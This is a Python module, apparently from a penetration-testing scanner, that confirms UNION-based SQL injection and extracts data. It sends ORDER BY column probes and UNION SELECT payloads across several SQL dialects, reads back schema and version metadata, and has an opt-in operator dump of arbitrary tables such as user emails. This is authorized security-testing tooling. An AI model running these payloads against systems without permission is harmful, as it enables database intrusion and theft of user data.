"""UNION-based SQLi data extraction (N1).

Once a parameter is injectable, a ``UNION SELECT`` pulls real data out of the DB —
which is both a stronger finding than error/boolean *and* the richest fuel for T3
chaining (leaked emails, tokens, schema become new surface/identities).

Confirmation stays mechanical and reflection-proof, the same trick SSTI/cmdi use:
we inject a **computed** marker — the token bracketing the product of the marker's
arithmetic pair, concatenated *in the database* (``'tok' || (a*b) || 'tok'``). A
plain reflector echoes the literal expression; only a UNION that actually executed
renders the product. So a match is proof the injected SELECT ran, never mere
reflection.

Method (all bounded, break on first success):
  1. column count via ``ORDER BY n`` — the n that first errors bounds it;
  2. the reflecting column — the marker placed in each position, every other
     column padded with a distinct string literal (a NULL pad makes some apps
     drop the synthetic row), across a few context prefixes / comment styles /
     concat dialects;
  3. read-only extraction — DB version + schema table names, each wrapped in the
     token so the value is unambiguous to pull back out.

Read-only by construction: extraction expressions only read metadata; nothing is
written or dropped.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence

from core.injection.adapt import read_response
from core.injection.markers import Marker

# Context breakouts (what closes the injected string/number before UNION).
_PREFIXES = ["'))", "')", "'", "1", ""]
# Comment styles that swallow the rest of the original query.
_COMMENTS = ["-- ", "-- -", "#"]
# String-concat dialects for the computed marker.
_DIALECTS = ["generic", "mysql", "mssql"]

_MAX_COLUMNS = 10


def _body(resp) -> str:
    body = getattr(resp, "body", b"") or b""
    return body.decode("utf-8", errors="replace") if isinstance(body, bytes) else str(body)


def _concat(dialect: str, inner_sql: str, tok: str) -> str:
    """``tok || (inner_sql) || tok`` in ``dialect``'s concat syntax."""
    if dialect == "mysql":
        return f"CONCAT('{tok}',({inner_sql}),'{tok}')"
    if dialect == "mssql":
        return f"'{tok}'+CAST(({inner_sql}) AS VARCHAR)+'{tok}'"
    return f"'{tok}'||({inner_sql})||'{tok}'"          # generic: sqlite/postgres/oracle


def _union_payload(prefix: str, columns: int, position: int, expr: str,
                   comment: str) -> str:
    """A UNION SELECT with ``expr`` at ``position`` and string-literal padding.

    Padding every other column with a distinct string keeps the synthetic row
    renderable in apps that drop rows with NULL columns.
    """
    cols = [expr if i == position else f"'{i + 1}'" for i in range(columns)]
    return f"{prefix} UNION SELECT {','.join(cols)}{comment}"


def _errored(resp) -> bool:
    read = read_response(resp)
    return read.status >= 500 or read.sql_db is not None


def _discover_columns(send: Callable[[str], Any], prefix: str,
                      max_columns: int) -> int:
    """``ORDER BY n`` until it errors — the last non-erroring n is the count."""
    last_ok = 0
    for n in range(1, max_columns + 1):
        if _errored(send(f"{prefix} ORDER BY {n}-- ")):
            break
        last_ok = n
    return last_ok


# Read-only extraction expressions per dialect (metadata only — no writes).
_EXTRACTS: Dict[str, Dict[str, str]] = {
    "db_version": {
        "generic": "sqlite_version()",
        "mysql": "version()",
        "mssql": "@@version",
    },
    "tables": {
        "generic": "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
        "mysql": "(SELECT group_concat(table_name) FROM information_schema.tables "
                 "WHERE table_schema=database())",
        "mssql": "(SELECT STRING_AGG(name,',') FROM sys.tables)",
    },
}


def _between(text: str, tok: str) -> str:
    i = text.find(tok)
    if i < 0:
        return ""
    j = text.find(tok, i + len(tok))
    return text[i + len(tok):j] if j > i else ""


@dataclass
class UnionResult:
    prefix: str
    columns: int
    position: int
    dialect: str
    comment: str
    confirm_payload: str
    extracted: Dict[str, str] = field(default_factory=dict)

    def summary(self) -> str:
        got = ", ".join(f"{k}={v[:40]}" for k, v in self.extracted.items())
        return (f"UNION {self.columns}col @pos{self.position} ({self.dialect}, "
                f"prefix {self.prefix!r}); extracted: {got or 'none'}")


def extract_via_union(
    point: Any,
    send: Callable[[str], Any],
    marker: Marker,
    *,
    max_columns: int = _MAX_COLUMNS,
    extract: bool = True,
    extract_sql: Optional[Sequence[str]] = None,
) -> Optional[UnionResult]:
    """Confirm UNION injectability (reflection-proof) and pull read-only data.

    ``send`` is the runner's guarded send closure, so every request counts against
    the budget and feeds the health tracker. Returns None if no UNION vector
    confirms. ``extract_sql`` are OPERATOR-DECLARED scalar SELECT fragments (e.g.
    ``SELECT group_concat(email) FROM Users``) pulled in addition to the read-only
    schema/version defaults — the opt-in path for a real data dump on an
    authorized target.
    """
    tok = marker.token
    expected = f"{tok}{marker.product}{tok}"
    inner = f"{marker.a}*{marker.b}"
    for prefix in _PREFIXES:
        columns = _discover_columns(send, prefix, max_columns)
        if columns < 1:
            continue
        for dialect in _DIALECTS:
            expr = _concat(dialect, inner, tok)
            for comment in _COMMENTS:
                for pos in range(columns):
                    payload = _union_payload(prefix, columns, pos, expr, comment)
                    if expected in _body(send(payload)):
                        result = UnionResult(
                            prefix=prefix, columns=columns, position=pos,
                            dialect=dialect, comment=comment,
                            confirm_payload=payload)
                        if extract:
                            result.extracted = _run_extraction(
                                send, prefix, columns, pos, dialect, comment, tok,
                                extract_sql)
                        return result
    return None


def _run_extraction(send, prefix, columns, position, dialect, comment, tok,
                    extract_sql: Optional[Sequence[str]] = None):
    """Pull each read-only expression back, wrapped in the token.

    Built-in defaults (schema/version) first; then any operator-declared
    ``extract_sql`` scalar SELECT fragments (the opt-in data dump).
    """
    out: Dict[str, str] = {}
    exprs_to_run: List[tuple] = [
        (label, exprs.get(dialect) or exprs.get("generic"))
        for label, exprs in _EXTRACTS.items()
    ]
    for i, custom in enumerate(extract_sql or []):
        exprs_to_run.append((f"custom_{i}", custom))
    for label, inner_sql in exprs_to_run:
        if not inner_sql:
            continue
        wrapped = _concat(dialect, inner_sql, tok)
        payload = _union_payload(prefix, columns, position, wrapped, comment)
        val = _between(_body(send(payload)), tok)
        if val:
            # operator dumps can be large (a group_concat of rows); keep more.
            out[label] = val[:4000 if label.startswith("custom_") else 500]
    return out


__all__ = ["UnionResult", "extract_via_union"]
